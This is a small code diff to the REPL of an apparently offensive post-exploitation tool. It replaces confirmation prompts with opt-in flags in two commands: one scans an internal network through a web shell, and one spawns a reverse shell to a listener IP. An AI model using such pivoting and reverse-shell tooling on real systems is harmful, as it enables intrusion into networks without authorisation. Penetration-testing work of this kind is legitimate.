@@ -491,7 +491,7 @@ class Repl(cmd2.Cmd):
     def _pivot_scan(self, args) -> None:
         hosts = self._resolve(args.hosts, "Hosts (CIDR)", "192.168.1.0/24")
         ports = self._resolve(args.ports, "Ports", "21,22,80,443,445,3306,3389")
-        banner = args.banner or self._confirm("Grab banners?")
+        banner = args.banner  # optional toggle: opt in with --banner (never prompts)
 
         def run(ws: WebShell) -> None:
             log.info(f"Scanning {hosts} for [{ports}]{' with banners' if banner else ''} ...")
@@ -506,7 +506,7 @@ class Repl(cmd2.Cmd):
     def _pivot_shell(self, args) -> None:
         ip = self._resolve(args.ip, "Listener IP", get_ip_address())
         port = int(self._resolve(args.port, "Listener port", "8888"))
-        listen = args.listen or self._confirm("Spawn a local listener here first?")
+        listen = args.listen  # optional toggle: opt in with --listen (never prompts)
         if listen:
             revshell.reverse_shell_with_listener(self.webshells[0], ip, port, args.method, args.tool)
         else:
